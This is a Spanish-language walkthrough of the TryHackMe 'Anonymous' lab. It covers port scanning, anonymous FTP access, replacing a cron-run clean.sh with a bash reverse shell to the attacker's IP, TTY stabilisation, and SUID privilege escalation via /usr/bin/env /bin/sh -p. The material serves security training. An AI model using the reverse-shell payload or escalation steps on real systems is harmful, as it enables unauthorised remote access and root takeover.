# Ejercicio Práctico – Explotación FTP login Anonymous + Escalada de Privilegios Binarios SUID

Maquinas que vamos a utilizar **Kali Linux y Anonymous**

[https://tryhackme.com/room/anonymous](https://tryhackme.com/room/anonymous)

```bash
ifconfig
```

![image.png](./imagenes/image%2048.png)

Mi IP: 10.21.166.149

```bash
ping -c 1 10.10.47.179 
```

![image.png](./imagenes/image%2049.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=2000 -n -vvv -Pn 10.10.47.179
```

![image.png](./imagenes/image%2050.png)

`21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later`

`22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`

`139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)`

`445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)`

- Entramos en el FTP aprovechando que tiene habilitada la entrada **anonymous**
    
    ```bash
    ftp 10.10.47.179
    ```
    
    ![image.png](./imagenes/image%2051.png)
    
    `ls`
    
    ![image.png](./imagenes/image%2052.png)
    

`cd scripts`

`ls`

![image.png](./imagenes/image%2053.png)

- Mirándolo así da que pensar que el archivo [clean.sh](./imagenes/http://clean.sh) se ejecuta de forma automatizada. Nos descargamos el archivo a nuestra maquina para examinarlo y nos salimos del FTP.
    
    `get clean.sh`
    
    `exit`
    
    ![image.png](./imagenes/image%2054.png)
    

- Miramos el contenido de [clean.sh](./imagenes/http://clean.sh) mediante **cat** para entender lo que hace.
    
    ```bash
    cat clean.sh
    ```
    
    ![image.png](./imagenes/image%2055.png)
    
    La explicación rápida seria que este archivo se ejecuta cada cierto tiempo para hacer limpieza de Logs del sistema.
    
- Vamos a **crear un clean.sh malicioso** y lo subiremos a la maquina.
    - editamos clean.sh y eliminamos su contenido y lo vamos a sustituir por el de una reverse shell.
        
        ```bash
        nano [clean.sh](./imagenes/http://clean.sh) 
        ```
        
        `#!/bin/bash
        
        bash -i >& /dev/tcp/10.21.166.149/443 0>&1`
        
        ![image.png](./imagenes/image%2056.png)
        
- Volvemos a entrar en el FTP.
    
    ```bash
    ftp 10.10.47.179 
    ```
    
    ![image.png](./imagenes/image%2057.png)
    
    - Nos movemos a la carpeta scripts
        
        `cd scripts`
        
        `ls`
        
        ![image.png](./imagenes/image%2058.png)
        
    - Subimos el archivo modificado a la maquina victima. Y salimos del FTP
        
        `put clean.sh`
        
        ![image.png](./imagenes/image%2059.png)
        
        ![image.png](./imagenes/image%2060.png)
        
        Nos sustituye el archivo original por el nuestro.
        
        `exit`
        

- Nos ponemos a la escucha por el puerto 443 y veremos que después de un rato tendríamos la conexión.
    
    ```bash
    nc -nlvp 443
    ```
    
    ![image.png](./imagenes/image%2061.png)
    
    - Hacemos un tratamiento de la TTY
        
        `script /dev/null -c bash`
        
        `CTRL+Z`
        
        ![image.png](./imagenes/image%2062.png)
        
        ```bash
        stty raw -echo; fg
        ```
        
        `reset xterm`
        
        ![image.png](./imagenes/image%2063.png)
        
        `export TERM=xterm`
        
        `export SHELL=bash`
        
        ![image.png](./imagenes/image%2064.png)
        
    - Vamos a enumerar dentro de la maquina binarios vulnerables SUID.
        
        `find / -perm -4000 2>/dev/null`
        
        ![image.png](./imagenes/image%2065.png)
        
    - Usamos la pagina de [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/) para probar cual de ellos es vulnerable. En mi caso seria **/usr/bin/env**
        
        ![image.png](./imagenes/image%2066.png)
        
        - Probamos **env /bin/sh -p**
            
            `/usr/bin/env /bin/sh -p` 
            
            ![image.png](./imagenes/image%2067.png)
            
            `/usr/bin/env`: La ruta absoluta que nos aparece al buscar con find
            
            `/bin/sh -p`: código que hemos encontrado en [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/).
            
        - Miramos quienes somos y veos que somos root.
            
            `whoami`
            
            ![image.png](./imagenes/image%2068.png)